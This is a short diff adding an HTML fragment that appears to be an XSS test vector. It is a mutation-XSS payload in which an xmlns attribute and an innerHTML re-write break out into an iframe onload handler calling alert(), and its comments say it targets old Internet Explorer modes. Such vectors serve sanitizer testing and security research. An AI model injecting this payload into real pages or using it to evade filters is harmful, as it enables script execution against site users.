@@ -1,0 +1,6 @@
+<div id="97"><!-- IE 5-9 -->
+<div id=d><x xmlns="><iframe onload=alert(97)"></div>
+<script>d.innerHTML+='';</script>
+<!-- IE 10 in IE5-9 Standards mode -->
+<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
